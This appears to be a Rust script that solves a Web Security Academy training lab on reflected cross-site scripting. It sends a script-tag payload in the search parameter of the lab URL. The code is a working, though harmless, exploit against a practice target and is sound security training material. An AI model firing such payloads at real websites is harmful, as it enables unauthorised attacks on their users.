/*************************************************************
*
* Lab: Reflected XSS into HTML context with nothing encoded
*
* Hack Steps: 
*      1. Inject payload in the search query parameter
*      2. Observe that the alert function has been called
*
**************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a9100440438a6c080f80d010082008c.web-security-academy.net";

fn main() {
    let payload = "<script>alert(1)</script>";

    print!("❯❯ Injecting payload in the search query parameter.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    client
        .get(format!("{LAB_URL}?search={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}